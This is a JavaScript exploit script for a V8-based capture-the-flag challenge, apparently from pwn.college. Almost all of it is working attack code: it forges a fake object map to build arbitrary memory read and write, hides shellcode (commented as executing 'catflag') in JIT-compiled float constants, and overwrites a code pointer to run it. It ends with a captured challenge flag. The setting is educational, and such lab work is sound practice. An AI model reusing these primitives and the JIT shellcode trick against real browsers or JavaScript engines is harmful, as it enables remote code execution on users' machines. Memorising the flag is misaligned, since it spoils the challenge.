var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

const logInfo = (m) => console.log(`[*] ${m}`);
const logOK   = (m) => console.log(`[+] ${m}`);
const logErr  = (m) => console.log(`[-] ${m}`);

function toHex(i) {
    return "0x" + i.toString(16).padStart(8, "0");
}

function assert(c, m="assert") {
  if (c) return;
  let at = "";
  try { at = ((new Error()).stack || "").split("\n")[2].trim(); } catch {}
  const e = new Error(`[ASSERT] ${m}` + (at ? `\n  at ${at}` : ""));
  if (Error.captureStackTrace) Error.captureStackTrace(e, assert);
  throw e;
}

let float_arr = [1.1, 2.2, 3.3];
// First we construct a fake map in memory
// Remember that the first 4 WORDS (0x10 bytes || WORDS = 4 bytes in this case we
// work with 32-bits address) of one object look like this:
// map | properties | elements | length
let fake_map = [itof(0x123456789abcdefn), 1.1, 1.1, 1.1];
let fake_map_addr = GetAddressOf(fake_map);
// Address of the content of the fake map
// So that we can use GetFakeObject on it to create a fake object
let element_addr = fake_map_addr - 0x20;
// Write a fake map pointer at the start of our float array
fake_map[0] = itof(0x1cb8a5n);

function arbRead(addr) {
    addr = BigInt(addr);

    if (addr % 2n == 0n) {
        addr += 1n;
    }

    fake_map[1] = itof(0x600000000n + (addr - 8n));
    let fake_obj = GetFakeObject(element_addr);
    return ftoi(fake_obj[0]);
}

function arbWrite(addr, val) {
    addr = BigInt(addr);
    val  = BigInt(val);

    if (addr % 2n == 0n) {
        addr += 1n;
    }

    fake_map[1] = itof(0x600000000n + (addr - 8n));
    let fake_obj = GetFakeObject(element_addr);
    fake_obj[0] = itof(val);
}

// execve("catflag", NULL, NULL)
const shellcode = () => {
    return [
        1.9995716422075807e-246,
        1.9710255944286777e-246,
        1.97118242283721e-246,
        1.971136949489835e-246,
        1.9711826272869888e-246,
        1.9711829003383248e-246,
        -9.254983612527998e+61,
    ];
};

for(let i = 0; i< 10000; i++)
{
    shellcode();
}

let shellcode_addr = GetAddressOf(shellcode);
logOK("Shellcode addr: " + toHex(shellcode_addr));

// %DebugPrint(shellcode);

let code_ptr = arbRead(shellcode_addr + 0xc) & 0xffffffffn;
logOK("code ptr: " + toHex(code_ptr));

let rwx_addr = arbRead(code_ptr + 0x14n);
logOK("rwx addr: " + toHex(rwx_addr));

let shellcode_start = rwx_addr + 0x69n + 2n;
logInfo("shellcode addr: " + toHex(shellcode_start));

arbWrite(code_ptr + 0x14n, shellcode_start);

// %SystemBreak();
shellcode();
// pwn.college{oF_cxWWy2Mn81r-l_Ad8Z7fYoM_.dZTO3UDL1MTNzYzW}
